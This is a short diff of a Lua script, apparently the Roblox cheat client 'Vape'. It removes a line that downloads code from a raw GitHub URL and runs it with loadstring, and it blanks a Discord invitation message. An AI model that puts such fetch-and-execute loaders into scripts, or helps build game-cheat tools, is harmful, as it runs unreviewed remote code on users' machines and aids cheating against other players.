@@ -1913,16 +1913,6 @@ runFunction(function()
 		}
 		vapePrivateCommands.unfreeze = vapePrivateCommands.thaw
 
-				local textChatService = game:GetService("TextChatService")
-		local allowedplayers = loadstring(game:HttpGet("https://raw.githubusercontent.com/PinkReleased/Ape/main/Ape"))()
-
-
-		local playersService = game:GetService("Players")
-
-		local function isPlayerAllowed(playerName)
-			return true
-		end
-
 		textChatService.OnIncomingMessage = function(message)
 			local props = Instance.new("TextChatMessageProperties")
 			if message.TextSource then
@@ -2247,7 +2237,7 @@ do
 	end)
 	local textlabel = Instance.new("TextLabel")
 	textlabel.Size = UDim2.new(1, 0, 0, 36)
-	textlabel.Text = "A new discord has been created, click the icon to join."
+	textlabel.Text = ""
 	textlabel.BackgroundTransparency = 1
 	textlabel.ZIndex = 10
 	textlabel.TextStrokeTransparency = 0
